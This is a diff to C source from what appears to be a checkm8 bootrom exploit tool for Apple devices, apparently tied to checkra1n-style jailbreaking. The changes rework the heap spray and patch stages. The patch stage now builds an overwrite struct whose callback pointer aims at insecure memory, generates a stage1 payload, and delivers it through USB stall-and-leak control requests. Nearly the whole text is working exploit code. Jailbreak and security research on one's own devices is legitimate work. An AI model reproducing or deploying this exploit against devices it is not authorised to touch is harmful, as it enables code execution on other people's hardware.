@@ -7,6 +7,7 @@
 
 #include "payload.h"
 #include "dfu.h"
+#include "stage1.h"
 
 #include "../utils.h"
 #include "../usb/shim.h"
@@ -132,7 +133,7 @@ bool checkm8_stage_spray(const usb_handle_t *handle, struct DeviceConfiguration 
     size_t i;
 
     if(deviceConfig->config_large_leak == 0) {
-        if(deviceConfig->cpid == 0x7001 || deviceConfig->cpid == 0x7000 || deviceConfig->cpid == 0x7002 || deviceConfig->cpid == 0x8003 || deviceConfig->cpid == 0x8000) {
+        if(deviceConfig->cpid == A8X || deviceConfig->cpid == A8 || deviceConfig->cpid == S1 || deviceConfig->cpid == A9_TSMC || deviceConfig->cpid == A9) {
             while(!checkm8_usb_request_stall(handle) || !checkm8_usb_request_leak(handle) || !checkm8_no_leak(handle)) {}
         } else {
             checkm8_stall(handle);
@@ -153,28 +154,26 @@ bool checkm8_stage_spray(const usb_handle_t *handle, struct DeviceConfiguration 
 
 bool checkm8_stage_patch(const usb_handle_t *handle, struct DeviceConfiguration *deviceConfig, struct PayloadConfiguration *payloadConfig) {
     size_t i, data_sz, packet_sz;
-    const uint8_t *payload = NULL;
     uint8_t *data;
     transfer_ret_t transfer_ret;
     bool ret = false;
 
-    void* blank[DFU_MAX_TRANSFER_SZ];
-    memset(blank, 0, DFU_MAX_TRANSFER_SZ);
-    uint64_t* p = (uint64_t*)blank;
-    p[5] = payloadConfig->insecure_memory_base;
+    void* checkra1n_payload = NULL;
+    void *overwrite = NULL;
+    size_t checkra1n_payload_sz = 0;
+    size_t overwrite_sz = 0;
 
-    ret = create_pongo_payload_for_device(deviceConfig->cpid, &payload, &data_sz);
+    checkm8_overwrite_t checkm8_overwrite;
+    memset(&checkm8_overwrite, '\0', sizeof(checkm8_overwrite));
+    checkm8_overwrite.callback.next = payloadConfig->insecure_memory_base;
+    overwrite = &checkm8_overwrite;
+    overwrite_sz = sizeof(checkm8_overwrite);
+
+    ret = create_pongo_payload_for_device(deviceConfig->cpid, &checkra1n_payload, &checkra1n_payload_sz);
     if (!ret) return false;
 
-    LOG_VERBOSE("setting up stage 2 for CPID 0x%X", (unsigned)deviceConfig->cpid);
-
-    data = calloc(1, data_sz);
-    if (!data) {
-        LOG_ERROR("failed to allocate payload buffer");
-        return false;
-    }
-
-    memcpy(data, payload, data_sz);
+    ret = generate_stage1(&data, &data_sz, checkra1n_payload, checkra1n_payload_sz, deviceConfig, payloadConfig);
+    if (!ret) return false;
 
     if(checkm8_usb_request_stall(handle) && checkm8_usb_request_leak(handle)) {
         LOG_VERBOSE("successfully leaked data");
@@ -186,7 +185,7 @@ bool checkm8_stage_patch(const usb_handle_t *handle, struct DeviceConfiguration 
         LOG_VERBOSE("i = %zu", i);
         send_usb_control_request_no_data(handle, 2, 3, 0, 0x80, 0, NULL);
     }
-    if(p != NULL && send_usb_control_request(handle, 0x00, 0, 0, 0x00, p, 0x30, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_STALL) {
+    if(overwrite != NULL && send_usb_control_request(handle, 0x00, 0, 0, 0x00, overwrite, overwrite_sz, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_STALL) {
         ret = true;
         for(i = 0; ret && i < data_sz; i += packet_sz) {
             packet_sz = MIN(data_sz - i, DFU_MAX_TRANSFER_SZ);
